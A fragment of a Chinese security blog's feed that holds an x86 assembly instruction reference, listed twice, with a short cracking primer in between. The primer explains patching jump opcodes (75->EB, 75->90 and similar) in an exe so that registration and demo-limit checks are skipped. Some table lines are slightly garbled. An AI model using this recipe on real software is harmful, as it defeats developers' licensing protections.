data-num=\"106\"></td><td><pre>SCAS 串扫描。</pre></td></tr><tr><td data-num=\"107\"></td><td><pre>把AL或AX的内容与目标串作比较，比较结果反映在标志位。</pre></td></tr><tr><td data-num=\"108\"></td><td><pre>LODS 装入串。</pre></td></tr><tr><td data-num=\"109\"></td><td><pre>把源串中的元素(字或字节)逐一装入AL或AX中。</pre></td></tr><tr><td data-num=\"110\"></td><td><pre>( LODSB 传送字符。 LODSW 传送字。 LODSD 传送双字。 )</pre></td></tr><tr><td data-num=\"111\"></td><td><pre>STOS 保存串。</pre></td></tr><tr><td data-num=\"112\"></td><td><pre>是LODS的逆过程。</pre></td></tr><tr><td data-num=\"113\"></td><td><pre>REP 当CX/ECX&lt;>0时重复。</pre></td></tr><tr><td data-num=\"114\"></td><td><pre>REPE/REPZ 当ZF=1或比较结果相等，且CX/ECX&lt;>0时重复。</pre></td></tr><tr><td data-num=\"115\"></td><td><pre>REPNE/REPNZ 当ZF=0或比较结果不相等，且CX/ECX&lt;>0时重复。</pre></td></tr><tr><td data-num=\"116\"></td><td><pre>REPC 当CF=1且CX/ECX&lt;>0时重复。</pre></td></tr><tr><td data-num=\"117\"></td><td><pre>REPNC 当CF=0且CX/ECX&lt;>0时重复。</pre></td></tr><tr><td data-num=\"118\"></td><td><pre>五、程序转移指令</pre></td></tr><tr><td data-num=\"119\"></td><td><pre>──────────────────────────</pre></td></tr><tr><td data-num=\"120\"></td><td><pre>1>无条件转移指令 (长转移)</pre></td></tr><tr><td data-num=\"121\"></td><td><pre>JMP 无条件转移指令</pre></td></tr><tr><td data-num=\"122\"></td><td><pre>CALL 过程调用</pre></td></tr><tr><td data-num=\"123\"></td><td><pre>RET/RETF过程返回。</pre></td></tr><tr><td data-num=\"124\"></td><td><pre>2>条件转移指令 (短转移，-128到+127的距离内)</pre></td></tr><tr><td data-num=\"125\"></td><td><pre>( 当且仅当(SF XOR OF)=1时，OP1 JA/JNBE 不小于或不等于时转移。</pre></td></tr><tr><td data-num=\"126\"></td><td><pre>JAE/JNB 大于或等于转移。</pre></td></tr><tr><td data-num=\"127\"></td><td><pre>JB/JNAE 小于转移。</pre></td></tr><tr><td data-num=\"128\"></td><td><pre>JBE/JNA 小于或等于转移。</pre></td></tr><tr><td data-num=\"129\"></td><td><pre>以上四条，测试无符号整数运算的结果(标志C和Z)。</pre></td></tr><tr><td data-num=\"130\"></td><td><pre>JG/JNLE 大于转移。</pre></td></tr><tr><td data-num=\"131\"></td><td><pre>JGE/JNL 大于或等于转移。</pre></td></tr><tr><td data-num=\"132\"></td><td><pre>JL/JNGE 小于转移。</pre></td></tr><tr><td data-num=\"133\"></td><td><pre>JLE/JNG 小于或等于转移。</pre></td></tr><tr><td data-num=\"134\"></td><td><pre>以上四条，测试带符号整数运算的结果(标志S，O和Z)。</pre></td></tr><tr><td data-num=\"135\"></td><td><pre>JE/JZ 等于转移。</pre></td></tr><tr><td data-num=\"136\"></td><td><pre>JNE/JNZ 不等于时转移。</pre></td></tr><tr><td data-num=\"137\"></td><td><pre>JC 有进位时转移。</pre></td></tr><tr><td data-num=\"138\"></td><td><pre>JNC 无进位时转移。</pre></td></tr><tr><td data-num=\"139\"></td><td><pre>JNO 不溢出时转移。</pre></td></tr><tr><td data-num=\"140\"></td><td><pre>JNP/JPO 奇偶性为奇数时转移。</pre></td></tr><tr><td data-num=\"141\"></td><td><pre>JNS 符号位为 \"0\" 时转移。</pre></td></tr><tr><td data-num=\"142\"></td><td><pre>JO 溢出转移。</pre></td></tr><tr><td data-num=\"143\"></td><td><pre>JP/JPE 奇偶性为偶数时转移。</pre></td></tr><tr><td data-num=\"144\"></td><td><pre>JS 符号位为 \"1\" 时转移。</pre></td></tr><tr><td data-num=\"145\"></td><td><pre>3>循环控制指令(短转移)</pre></td></tr><tr><td data-num=\"146\"></td><td><pre>LOOP CX不为零时循环。</pre></td></tr><tr><td data-num=\"147\"></td><td><pre>LOOPE/LOOPZ CX不为零且标志Z=1时循环。</pre></td></tr><tr><td data-num=\"148\"></td><td><pre>LOOPNE/LOOPNZ CX不为零且标志Z=0时循环。</pre></td></tr><tr><td data-num=\"149\"></td><td><pre>JCXZ CX为零时转移。</pre></td></tr><tr><td data-num=\"150\"></td><td><pre>JECXZ ECX为零时转移。</pre></td></tr><tr><td data-num=\"151\"></td><td><pre>4>中断指令</pre></td></tr><tr><td data-num=\"152\"></td><td><pre>INT 中断指令</pre></td></tr><tr><td data-num=\"153\"></td><td><pre>INTO 溢出中断</pre></td></tr><tr><td data-num=\"154\"></td><td><pre>IRET 中断返回</pre></td></tr><tr><td data-num=\"155\"></td><td><pre>5>处理器控制指令</pre></td></tr><tr><td data-num=\"156\"></td><td><pre>HLT 处理器暂停， 直到出现中断或复位信号才继续。</pre></td></tr><tr><td data-num=\"157\"></td><td><pre>WAIT 当芯片引线TEST为高电平时使CPU进入等待状态。</pre></td></tr><tr><td data-num=\"158\"></td><td><pre>ESC 转换到外处理器。</pre></td></tr><tr><td data-num=\"159\"></td><td><pre>LOCK 封锁总线。</pre></td></tr><tr><td data-num=\"160\"></td><td><pre>NOP 空操作。</pre></td></tr><tr><td data-num=\"161\"></td><td><pre>STC 置进位标志位。</pre></td></tr><tr><td data-num=\"162\"></td><td><pre>CLC 清进位标志位。</pre></td></tr><tr><td data-num=\"163\"></td><td><pre>CMC 进位标志取反。</pre></td></tr><tr><td data-num=\"164\"></td><td><pre>STD 置方向标志位。</pre></td></tr><tr><td data-num=\"165\"></td><td><pre>CLD 清方向标志位。</pre></td></tr><tr><td data-num=\"166\"></td><td><pre>STI 置中断允许位。</pre></td></tr><tr><td data-num=\"167\"></td><td><pre>CLI 清中断允许位。</pre></td></tr><tr><td data-num=\"168\"></td><td><pre>六、伪指令</pre></td></tr><tr><td data-num=\"169\"></td><td><pre>───────────────────────────</pre></td></tr><tr><td data-num=\"170\"></td><td><pre>DW 定义字(2字节)。</pre></td></tr><tr><td data-num=\"171\"></td><td><pre>PROC 定义过程。</pre></td></tr><tr><td data-num=\"172\"></td><td><pre>ENDP 过程结束。</pre></td></tr><tr><td data-num=\"173\"></td><td><pre>SEGMENT 定义段。</pre></td></tr><tr><td data-num=\"174\"></td><td><pre>ASSUME 建立段寄存器寻址。</pre></td></tr><tr><td data-num=\"175\"></td><td><pre>ENDS 段结束。</pre></td></tr><tr><td data-num=\"176\"></td><td><pre>END 程序结束。</pre></td></tr><tr><td data-num=\"177\"></td><td><pre></pre></td></tr><tr><td data-num=\"178\"></td><td><pre>一.机械码,又称机器码.</pre></td></tr><tr><td data-num=\"179\"></td><td><pre>ultraedit打开,编辑exe文件时你会看到</pre></td></tr><tr><td data-num=\"180\"></td><td><pre>许许多多的由0,1,2,3,4,5,6,7,8,9,A,B,C,D,E,F组成的数码,这些数码</pre></td></tr><tr><td data-num=\"181\"></td><td><pre>就是机器码.</pre></td></tr><tr><td data-num=\"182\"></td><td><pre>修改程序时必须通过修改机器码来修改exe文件.</pre></td></tr><tr><td data-num=\"183\"></td><td><pre></pre></td></tr><tr><td data-num=\"184\"></td><td><pre>二.需要熟练掌握的全部汇编知识(只有这么多)</pre></td></tr><tr><td data-num=\"185\"></td><td><pre>不大容易理解,可先强行背住,混个脸儿熟,以后慢慢的就理解了</pre></td></tr><tr><td data-num=\"186\"></td><td><pre>cmp a,b 比较a与b</pre></td></tr><tr><td data-num=\"187\"></td><td><pre>mov a,b 把b的值送给a</pre></td></tr><tr><td data-num=\"188\"></td><td><pre>ret 返回主程序</pre></td></tr><tr><td data-num=\"189\"></td><td><pre>nop 无作用,英文“no operation”的简写，意思是“do nothing”(机器码90)***机器码的含义参看上面</pre></td></tr><tr><td data-num=\"190\"></td><td><pre>(解释:ultraedit打开编辑exe文件时你看到90,等同于汇编语句nop)</pre></td></tr><tr><td data-num=\"191\"></td><td><pre>call 调用子程序</pre></td></tr><tr><td data-num=\"192\"></td><td><pre>je 或jz 若相等则跳(机器码74 或0F84)</pre></td></tr><tr><td data-num=\"193\"></td><td><pre>jne或jnz 若不相等则跳(机器码75或0F85)</pre></td></tr><tr><td data-num=\"194\"></td><td><pre>jmp 无条件跳(机器码EB)</pre></td></tr><tr><td data-num=\"195\"></td><td><pre>jb 若小于则跳</pre></td></tr><tr><td data-num=\"196\"></td><td><pre>ja 若大于则跳</pre></td></tr><tr><td data-num=\"197\"></td><td><pre>jg 若大于则跳</pre></td></tr><tr><td data-num=\"198\"></td><td><pre>jge 若大于等于则跳</pre></td></tr><tr><td data-num=\"199\"></td><td><pre>jl 若小于则跳</pre></td></tr><tr><td data-num=\"200\"></td><td><pre>jle 若小于等于则跳</pre></td></tr><tr><td data-num=\"201\"></td><td><pre>pop 出栈</pre></td></tr><tr><td data-num=\"202\"></td><td><pre>push 压栈</pre></td></tr><tr><td data-num=\"203\"></td><td><pre></pre></td></tr><tr><td data-num=\"204\"></td><td><pre>三.常见修改(机器码)</pre></td></tr><tr><td data-num=\"205\"></td><td><pre>74=>75 74=>90 74=>EB</pre></td></tr><tr><td data-num=\"206\"></td><td><pre>75=>74 75=>90 75=>EB</pre></td></tr><tr><td data-num=\"207\"></td><td><pre></pre></td></tr><tr><td data-num=\"208\"></td><td><pre>jnz->nop</pre></td></tr><tr><td data-num=\"209\"></td><td><pre>75->90(相应的机器码修改)</pre></td></tr><tr><td data-num=\"210\"></td><td><pre></pre></td></tr><tr><td data-num=\"211\"></td><td><pre>jnz -> jmp</pre></td></tr><tr><td data-num=\"212\"></td><td><pre>75 -> EB(相应的机器码修改)</pre></td></tr><tr><td data-num=\"213\"></td><td><pre></pre></td></tr><tr><td data-num=\"214\"></td><td><pre>jnz -> jz</pre></td></tr><tr><td data-num=\"215\"></td><td><pre>75->74 (正常) 0F 85 -> 0F 84(特殊情况下,有时,相应的机器码修改)</pre></td></tr><tr><td data-num=\"216\"></td><td><pre></pre></td></tr><tr><td data-num=\"217\"></td><td><pre>四.两种不同情况的不同修改方法</pre></td></tr><tr><td data-num=\"218\"></td><td><pre>1.修改为jmp</pre></td></tr><tr><td data-num=\"219\"></td><td><pre>je(jne,jz,jnz) =>jmp相应的机器码EB （出错信息向上找到的第一个跳转）jmp的作用是绝对跳，无条件跳，从而跳过下面的出错信息</pre></td></tr><tr><td data-num=\"220\"></td><td><pre></pre></td></tr><tr><td data-num=\"221\"></td><td><pre>xxxxxxxxxxxx 出错信息，例如：注册码不对，sorry,未注册版不能...，\"Function Not Avaible in Demo\" 或 \"Command Not Avaible\" 或 \"Can't save in Shareware/Demo\"等 （我们希望把它跳过，不让它出现）</pre></td></tr><tr><td data-num=\"222\"></td><td><pre>。。。</pre></td></tr><tr><td data-num=\"223\"></td><td><pre>。。。</pre></td></tr><tr><td data-num=\"224\"></td><td><pre>xxxxxxxxxxxx 正确路线所在</pre></td></tr><tr><td data-num=\"225\"></td><td><pre></pre></td></tr><tr><td data-num=\"226\"></td><td><pre>2.修改为nop</pre></td></tr><tr><td data-num=\"227\"></td><td><pre>je(jne,jz,jnz) =>nop相应的机器码90 （正确信息向上找到的第一个跳转） nop的作用是抹掉这个跳转，使这个跳转无效，失去作用，从而使程序顺利来到紧跟其后的正确信息处</pre></td></tr><tr><td data-num=\"228\"></td><td><pre></pre></td></tr><tr><td data-num=\"229\"></td><td><pre>xxxxxxxxxxxx 正确信息，例如：注册成功，谢谢您的支持等（我们希望它不被跳过，让它出现，程序一定要顺利来到这里）</pre></td></tr><tr><td data-num=\"230\"></td><td><pre>。。。</pre></td></tr><tr><td data-num=\"231\"></td><td><pre>。。。</pre></td></tr><tr><td data-num=\"232\"></td><td><pre>xxxxxxxxxxxx 出错信息（我们希望不要跳到这里，不让它出现）它们在存贮器和寄存器、寄存器和输入输出端口之间传送数据.</pre></td></tr><tr><td data-num=\"233\"></td><td><pre>1. 通用数据传送指令.</pre></td></tr><tr><td data-num=\"234\"></td><td><pre>MOV 传送字或字节.</pre></td></tr><tr><td data-num=\"235\"></td><td><pre>MOVSX 先符号扩展,再传送.</pre></td></tr><tr><td data-num=\"236\"></td><td><pre>MOVZX 先零扩展,再传送.</pre></td></tr><tr><td data-num=\"237\"></td><td><pre>PUSH 把字压入堆栈.</pre></td></tr><tr><td data-num=\"238\"></td><td><pre>POP 把字弹出堆栈.</pre></td></tr><tr><td data-num=\"239\"></td><td><pre>PUSHA 把AX,CX,DX,BX,SP,BP,SI,DI依次压入堆栈.</pre></td></tr><tr><td data-num=\"240\"></td><td><pre>POPA 把DI,SI,BP,SP,BX,DX,CX,AX依次弹出堆栈.</pre></td></tr><tr><td data-num=\"241\"></td><td><pre>PUSHAD 把EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI依次压入堆栈.</pre></td></tr><tr><td data-num=\"242\"></td><td><pre>POPAD 把EDI,ESI,EBP,ESP,EBX,EDX,ECX,EAX依次弹出堆栈.</pre></td></tr><tr><td data-num=\"243\"></td><td><pre>BSWAP 交换32位寄存器里字节的顺序</pre></td></tr><tr><td data-num=\"244\"></td><td><pre>XCHG 交换字或字节.( 至少有一个操作数为寄存器,段寄存器不可作为操作数)</pre></td></tr><tr><td data-num=\"245\"></td><td><pre>CMPXCHG 比较并交换操作数.( 第二个操作数必须为累加器AL/AX/EAX )</pre></td></tr><tr><td data-num=\"246\"></td><td><pre>XADD 先交换再累加.( 结果在第一个操作数里 )</pre></td></tr><tr><td data-num=\"247\"></td><td><pre>XLAT 字节查表转换.</pre></td></tr><tr><td data-num=\"248\"></td><td><pre>── BX 指向一张 256 字节的表的起点, AL 为表的索引值 (0-255,即</pre></td></tr><tr><td data-num=\"249\"></td><td><pre>0-FFH); 返回 AL 为查表结果. ( [BX+AL]->AL )</pre></td></tr><tr><td data-num=\"250\"></td><td><pre>2. 输入输出端口传送指令.</pre></td></tr><tr><td data-num=\"251\"></td><td><pre>IN I/O端口输入. ( 语法: IN 累加器, &#123;端口号│DX&#125; )</pre></td></tr><tr><td data-num=\"252\"></td><td><pre>OUT I/O端口输出. ( 语法: OUT &#123;端口号│DX&#125;,累加器 )</pre></td></tr><tr><td data-num=\"253\"></td><td><pre>输入输出端口由立即方式指定时, 其范围是 0-255; 由寄存器 DX 指定时,</pre></td></tr><tr><td data-num=\"254\"></td><td><pre>其范围是 0-65535.</pre></td></tr><tr><td data-num=\"255\"></td><td><pre>3. 目的地址传送指令.</pre></td></tr><tr><td data-num=\"256\"></td><td><pre>LEA 装入有效地址.</pre></td></tr><tr><td data-num=\"257\"></td><td><pre>例: LEA DX,string ;把偏移地址存到DX.</pre></td></tr><tr><td data-num=\"258\"></td><td><pre>LDS 传送目标指针,把指针内容装入DS.</pre></td></tr><tr><td data-num=\"259\"></td><td><pre>例: LDS SI,string ;把段地址:偏移地址存到DS:SI.</pre></td></tr><tr><td data-num=\"260\"></td><td><pre>LES 传送目标指针,把指针内容装入ES.</pre></td></tr><tr><td data-num=\"261\"></td><td><pre>例: LES DI,string ;把段地址:偏移地址存到ESI.</pre></td></tr><tr><td data-num=\"262\"></td><td><pre>LFS 传送目标指针,把指针内容装入FS.</pre></td></tr><tr><td data-num=\"263\"></td><td><pre>例: LFS DI,string ;把段地址:偏移地址存到FSI.</pre></td></tr><tr><td data-num=\"264\"></td><td><pre>LGS 传送目标指针,把指针内容装入GS.</pre></td></tr><tr><td data-num=\"265\"></td><td><pre>例: LGS DI,string ;把段地址:偏移地址存到GSI.</pre></td></tr><tr><td data-num=\"266\"></td><td><pre>LSS 传送目标指针,把指针内容装入SS.</pre></td></tr><tr><td data-num=\"267\"></td><td><pre>例: LSS DI,string ;把段地址:偏移地址存到SSI.</pre></td></tr><tr><td data-num=\"268\"></td><td><pre>4. 标志传送指令.</pre></td></tr><tr><td data-num=\"269\"></td><td><pre>LAHF 标志寄存器传送,把标志装入AH.</pre></td></tr><tr><td data-num=\"270\"></td><td><pre>SAHF 标志寄存器传送,把AH内容装入标志寄存器.</pre></td></tr><tr><td data-num=\"271\"></td><td><pre>PUSHF 标志入栈.</pre></td></tr><tr><td data-num=\"272\"></td><td><pre>POPF 标志出栈.</pre></td></tr><tr><td data-num=\"273\"></td><td><pre>PUSHD 32位标志入栈.</pre></td></tr><tr><td data-num=\"274\"></td><td><pre>POPD 32位标志出栈.</pre></td></tr><tr><td data-num=\"275\"></td><td><pre></pre></td></tr><tr><td data-num=\"276\"></td><td><pre>二、算术运算指令</pre></td></tr><tr><td data-num=\"277\"></td><td><pre>───────────────────────────────────────</pre></td></tr><tr><td data-num=\"278\"></td><td><pre>ADD 加法.</pre></td></tr><tr><td data-num=\"279\"></td><td><pre>ADC 带进位加法.</pre></td></tr><tr><td data-num=\"280\"></td><td><pre>INC 加 1.</pre></td></tr><tr><td data-num=\"281\"></td><td><pre>AAA 加法的ASCII码调整.</pre></td></tr><tr><td data-num=\"282\"></td><td><pre>DAA 加法的十进制调整.</pre></td></tr><tr><td data-num=\"283\"></td><td><pre>SUB 减法.</pre></td></tr><tr><td data-num=\"284\"></td><td><pre>SBB 带借位减法.</pre></td></tr><tr><td data-num=\"285\"></td><td><pre>DEC 减 1.</pre></td></tr><tr><td data-num=\"286\"></td><td><pre>NEC 求反(以 0 减之).</pre></td></tr><tr><td data-num=\"287\"></td><td><pre>CMP 比较.(两操作数作减法,仅修改标志位,不回送结果).</pre></td></tr><tr><td data-num=\"288\"></td><td><pre>AAS 减法的ASCII码调整.</pre></td></tr><tr><td data-num=\"289\"></td><td><pre>DAS 减法的十进制调整.</pre></td></tr><tr><td data-num=\"290\"></td><td><pre>MUL 无符号乘法.</pre></td></tr><tr><td data-num=\"291\"></td><td><pre>IMUL 整数乘法.</pre></td></tr><tr><td data-num=\"292\"></td><td><pre>以上两条,结果回送AH和AL(字节运算),或DX和AX(字运算),</pre></td></tr><tr><td data-num=\"293\"></td><td><pre>AAM 乘法的ASCII码调整.</pre></td></tr><tr><td data-num=\"294\"></td><td><pre>DIV 无符号除法.</pre></td></tr><tr><td data-num=\"295\"></td><td><pre>IDIV 整数除法.</pre></td></tr><tr><td data-num=\"296\"></td><td><pre>以上两条,结果回送:</pre></td></tr><tr><td data-num=\"297\"></td><td><pre>商回送AL,余数回送AH, (字节运算);</pre></td></tr><tr><td data-num=\"298\"></td><td><pre>或 商回送AX,余数回送DX, (字运算).</pre></td></tr><tr><td data-num=\"299\"></td><td><pre>AAD 除法的ASCII码调整.</pre></td></tr><tr><td data-num=\"300\"></td><td><pre>CBW 字节转换为字. (把AL中字节的符号扩展到AH中去)</pre></td></tr><tr><td data-num=\"301\"></td><td><pre>CWD 字转换为双字. (把AX中的字的符号扩展到DX中去)</pre></td></tr><tr><td data-num=\"302\"></td><td><pre>CWDE 字转换为双字. (把AX中的字符号扩展到EAX中去)</pre></td></tr><tr><td data-num=\"303\"></td><td><pre>CDQ 双字扩展. (把EAX中的字的符号扩展到EDX中去)</pre></td></tr><tr><td data-num=\"304\"></td><td><pre></pre></td></tr><tr><td data-num=\"305\"></td><td><pre>三、逻辑运算指令</pre></td></tr><tr><td data-num=\"306\"></td><td><pre>───────────────────────────────────────</pre></td></tr><tr><td data-num=\"307\"></td><td><pre>AND 与运算.</pre></td></tr><tr><td data-num=\"308\"></td><td><pre>OR 或运算.</pre></td></tr><tr><td data-num=\"309\"></td><td><pre>XOR 异或运算.</pre></td></tr><tr><td data-num=\"310\"></td><td><pre>NOT 取反.</pre></td></tr><tr><td data-num=\"311\"></td><td><pre>TEST 测试.(两操作数作与运算,仅修改标志位,不回送结果).</pre></td></tr><tr><td data-num=\"312\"></td><td><pre>SHL 逻辑左移.</pre></td></tr><tr><td data-num=\"313\"></td><td><pre>SAL 算术左移.(=SHL)</pre></td></tr><tr><td data-num=\"314\"></td><td><pre>SHR 逻辑右移.</pre></td></tr><tr><td data-num=\"315\"></td><td><pre>SAR 算术右移.(=SHR)</pre></td></tr><tr><td data-num=\"316\"></td><td><pre>ROL 循环左移.</pre></td></tr><tr><td data-num=\"317\"></td><td><pre>ROR 循环右移.</pre></td></tr><tr><td data-num=\"318\"></td><td><pre>RCL 通过进位的循环左移.</pre></td></tr><tr><td data-num=\"319\"></td><td><pre>RCR 通过进位的循环右移.</pre></td></tr><tr><td data-num=\"320\"></td><td><pre>以上八种移位指令,其移位次数可达255次.</pre></td></tr><tr><td data-num=\"321\"></td><td><pre>移位一次时, 可直接用操作码. 如 SHL AX,1.</pre></td></tr><tr><td data-num=\"322\"></td><td><pre>移位>1次时, 则由寄存器CL给出移位次数.</pre></td></tr><tr><td data-num=\"323\"></td><td><pre>如 MOV CL,04</pre></td></tr><tr><td data-num=\"324\"></td><td><pre>SHL AX,CL</pre></td></tr><tr><td data-num=\"325\"></td><td><pre></pre></td></tr><tr><td data-num=\"326\"></td><td><pre>四、串指令</pre></td></tr><tr><td data-num=\"327\"></td><td><pre>───────────────────────────────────────</pre></td></tr><tr><td data-num=\"328\"></td><td><pre>DS:SI 源串段寄存器 :源串变址.</pre></td></tr><tr><td data-num=\"329\"></td><td><pre>ESI 目标串段寄存器:目标串变址.</pre></td></tr><tr><td data-num=\"330\"></td><td><pre>CX 重复次数计数器.</pre></td></tr><tr><td data-num=\"331\"></td><td><pre>AL/AX 扫描值.</pre></td></tr><tr><td data-num=\"332\"></td><td><pre>D标志 0表示重复操作中SI和DI应自动增量; 1表示应自动减量.</pre></td></tr><tr><td data-num=\"333\"></td><td><pre>Z标志 用来控制扫描或比较操作的结束.</pre></td></tr><tr><td data-num=\"334\"></td><td><pre>MOVS 串传送.</pre></td></tr><tr><td data-num=\"335\"></td><td><pre>( MOVSB 传送字符. MOVSW 传送字. MOVSD 传送双字. )</pre></td></tr><tr><td data-num=\"336\"></td><td><pre>CMPS 串比较.</pre></td></tr><tr><td data-num=\"337\"></td><td><pre>( CMPSB 比较字符. CMPSW 比较字. )</pre></td></tr><tr><td data-num=\"338\"></td><td><pre>SCAS 串扫描.</pre></td></tr><tr><td data-num=\"339\"></td><td><pre>把AL或AX的内容与目标串作比较,比较结果反映在标志位.</pre></td></tr><tr><td data-num=\"340\"></td><td><pre>LODS 装入串.</pre></td></tr><tr><td data-num=\"341\"></td><td><pre>把源串中的元素(字或字节)逐一装入AL或AX中.</pre></td></tr><tr><td data-num=\"342\"></td><td><pre>( LODSB 传送字符. LODSW 传送字. LODSD 传送双字. )</pre></td></tr><tr><td data-num=\"343\"></td><td><pre>STOS 保存串.</pre></td></tr><tr><td data-num=\"344\"></td><td><pre>是LODS的逆过程.</pre></td></tr><tr><td data-num=\"345\"></td><td><pre>REP 当CX/ECX&lt;>0时重复.</pre></td></tr><tr><td data-num=\"346\"></td><td><pre>REPE/REPZ 当ZF=1或比较结果相等,且CX/ECX&lt;>0时重复.</pre></td></tr><tr><td data-num=\"347\"></td><td><pre>REPNE/REPNZ 当ZF=0或比较结果不相等,且CX/ECX&lt;>0时重复.</pre></td></tr><tr><td data-num=\"348\"></td><td><pre>REPC 当CF=1且CX/ECX&lt;>0时重复.</pre></td></tr><tr><td data-num=\"349\"></td><td><pre>REPNC 当CF=0且CX/ECX&lt;>0时重复.</pre></td></tr><tr><td data-num=\"350\"></td><td><pre></pre></td></tr><tr><td data-num=\"351\"></td><td><pre>五、程序转移指令</pre></td></tr><tr><td data-num=\"352\"></td><td><pre>───────────────────────────────────────</pre></td></tr><tr><td data-num=\"353\"></td><td><pre>1>无条件转移指令 (长转移)</pre></td></tr><tr><td data-num=\"354\"></td><td><pre>JMP 无条件转移指令</pre></td></tr><tr><td data-num=\"355\"></td><td><pre>CALL 过程调用</pre></td></tr><tr><td data-num=\"356\"></td><td><pre>RET/RETF过程返回.</pre></td></tr><tr><td data-num=\"357\"></td><td><pre>2>条件转移指令 (短转移,-128到+127的距离内)</pre></td></tr><tr><td data-num=\"358\"></td><td><pre>( 当且仅当(SF XOR OF)=1时,OP1&lt;OP2 )</pre></td></tr><tr><td data-num=\"359\"></td><td><pre>JA/JNBE 不小于或不等于时转移.</pre></td></tr><tr><td data-num=\"360\"></td><td><pre>JAE/JNB 大于或等于转移.</pre></td></tr><tr><td data-num=\"361\"></td><td><pre>JB/JNAE 小于转移.</pre></td></tr><tr><td data-num=\"362\"></td><td><pre>JBE/JNA 小于或等于转移.</pre></td></tr><tr><td data-num=\"363\"></td><td><pre>以上四条,测试无符号整数运算的结果(标志C和Z).</pre></td></tr><tr><td data-num=\"364\"></td><td><pre>JG/JNLE 大于转移.</pre></td></tr><tr><td data-num=\"365\"></td><td><pre>JGE/JNL 大于或等于转移.</pre></td></tr><tr><td data-num=\"366\"></td><td><pre>JL/JNGE 小于转移.</pre></td></tr><tr><td data-num=\"367\"></td><td><pre>JLE/JNG 小于或等于转移.</pre></td></tr><tr><td data-num=\"368\"></td><td><pre>以上四条,测试带符号整数运算的结果(标志S,O和Z).</pre></td></tr><tr><td data-num=\"369\"></td><td><pre>JE/JZ 等于转移.</pre></td></tr><tr><td data-num=\"370\"></td><td><pre>JNE/JNZ 不等于时转移.</pre></td></tr><tr><td data-num=\"371\"></td><td><pre>JC 有进位时转移.</pre></td></tr><tr><td data-num=\"372\"></td><td><pre>JNC 无进位时转移.</pre></td></tr><tr><td data-num=\"373\"></td><td><pre>JNO 不溢出时转移.</pre></td></tr><tr><td data-num=\"374\"></td><td><pre>JNP/JPO 奇偶性为奇数时转移.</pre></td></tr><tr><td data-num=\"375\"></td><td><pre>JNS 符号位为 \"0\" 时转移.</pre></td></tr><tr><td data-num=\"376\"></td><td><pre>JO 溢出转移.</pre></td></tr><tr><td data-num=\"377\"></td><td><pre>JP/JPE 奇偶性为偶数时转移.</pre></td></tr><tr><td data-num=\"378\"></td><td><pre>JS 符号位为 \"1\" 时转移.</pre></td></tr><tr><td data-num=\"379\"></td><td><pre>3>循环控制指令(短转移)</pre></td></tr><tr><td data-num=\"380\"></td><td><pre>LOOP CX不为零时循环.</pre></td></tr><tr><td data-num=\"381\"></td><td><pre>LOOPE/LOOPZ CX不为零且标志Z=1时循环.</pre></td></tr><tr><td data-num=\"382\"></td><td><pre>LOOPNE/LOOPNZ CX不为零且标志Z=0时循环.</pre></td></tr><tr><td data-num=\"383\"></td><td><pre>JCXZ CX为零时转移.</pre></td></tr><tr><td data-num=\"384\"></td><td><pre>JECXZ ECX为零时转移.</pre></td></tr><tr><td data-num=\"385\"></td><td><pre>4>中断指令</pre></td></tr><tr><td data-num=\"386\"></td><td><pre>INT 中断指令</pre></td></tr><tr><td data-num=\"387\"></td><td><pre>INTO 溢出中断</pre></td></tr><tr><td data-num=\"388\"></td><td><pre>IRET 中断返回</pre></td></tr><tr><td data-num=\"389\"></td><td><pre>5>处理器控制指令</pre></td></tr><tr><td data-num=\"390\"></td><td><pre>HLT 处理器暂停, 直到出现中断或复位信号才继续.</pre></td></tr><tr><td data-num=\"391\"></td><td><pre>WAIT 当芯片引线TEST为高电平时使CPU进入等待状态.</pre></td></tr><tr><td data-num=\"392\"></td><td><pre>ESC 转换到外处理器.</pre></td></tr><tr><td data-num=\"393\"></td><td><pre>LOCK 封锁总线.</pre></td></tr><tr><td data-num=\"394\"></td><td><pre>NOP 空操作.</pre></td></tr><tr><td data-num=\"395\"></td><td><pre>STC 置进位标志位.</pre></td></tr><tr><td data-num=\"396\"></td><td><pre>CLC 清进位标志位.</pre></td></tr><tr><td data-num=\"397\"></td><td><pre>CMC 进位标志取反.</pre></td></tr><tr><td data-num=\"398\"></td><td><pre>STD 置方向标志位.</pre></td></tr><tr><td data-num=\"399\"></td><td><pre>CLD 清方向标志位.</pre></td></tr><tr><td data-num=\"400\"></td><td><pre>STI 置中断允许位.</pre></td></tr><tr><td data-num=\"401\"></td><td><pre>CLI 清中断允许位.</pre></td></tr><tr><td data-num=\"402\"></td><td><pre></pre></td></tr><tr><td data-num=\"403\"></td><td><pre>六、伪指令</pre></td></tr><tr><td data-num=\"404\"></td><td><pre>───────────────────────────────────────</pre></td></tr><tr><td data-num=\"405\"></td><td><pre>DW 定义字(2字节).</pre></td></tr><tr><td data-num=\"406\"></td><td><pre>PROC 定义过程.</pre></td></tr><tr><td data-num=\"407\"></td><td><pre>ENDP 过程结束.</pre></td></tr><tr><td data-num=\"408\"></td><td><pre>SEGMENT 定义段.</pre></td></tr><tr><td data-num=\"409\"></td><td><pre>ASSUME 建立段寄存器寻址.</pre></td></tr><tr><td data-num=\"410\"></td><td><pre>ENDS 段结束.</pre></td></tr><tr><td data-num=\"411\"></td><td><pre>END 程序结束</pre></td></tr></table></figure>",
            "tags": [
                "网络安全",
                "技术干货",
                "黑客"
            ]
        },
        {
            "id": "http://zhyzhyzhy.cn/2022/10/28/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/",
            "url": "http://zhyzhyzhy.cn/2022/10/28/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/",
            "title": "shiro反序列化漏洞环境搭建",
            "date_published": "2022-10-27T17:00:00.000Z",
